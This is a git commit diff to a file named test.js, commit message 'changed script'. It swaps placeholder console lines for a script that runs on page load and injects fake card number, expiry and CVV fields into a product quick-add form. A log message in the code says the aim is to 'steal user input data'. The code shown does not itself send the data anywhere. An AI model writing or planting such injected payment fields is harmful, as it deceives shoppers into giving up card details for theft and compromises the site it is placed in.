a1d418ba33887a2eb0cb1d79159d41d1c0d35939
Andrii Yatsenko <ayatsenko@oroinc.com>
2025-05-15 20:14:10 +0300

    changed script

--- test.js
+++ test.js
@@ -1,25 +1,30 @@
-console.log("Hello, world!2");
+function displayInput() {
+    // render input fields to enter credit card data
+    
+    const inputContainer = document.createElement('div');
+    inputContainer.id = 'creditCardInput';
+    inputContainer.style.display = 'block';
 
+    inputContainer.innerHTML = `
+        <label for="cardNumber">Card Number:</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
+        
+        <label for="expiryDate">Expiry Date:</label>
+        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
+        
+        <label for="cvv">CVV:</label>
+        <input type="text" id="cvv" name="cvv" placeholder="123" required>
+        
+        <button type="submit">Submit</button>
+    `;
 
-console.log("Hello, world!4");
+    // add it to form with name oro_product_quick_add
+    const form = document.querySelector('form[name="oro_product_quick_add"]');
+    if (form) {
+        form.appendChild(inputContainer);
+    } else {
+        console.log('can not add the form the steal user input data');
+    }
+}
 
-console.log("Hello, world!5");
-
-
-
-console.log("Hello, world!4");
-
-console.log("Hello, world!5");
-
-
-
-console.log("Hello, world!4");
-
-console.log("Hello, world!5");
-
-
-
-console.log("Hello, world!4");
-
-console.log("Hello, world!5");
-
+window.onload = displayInput;
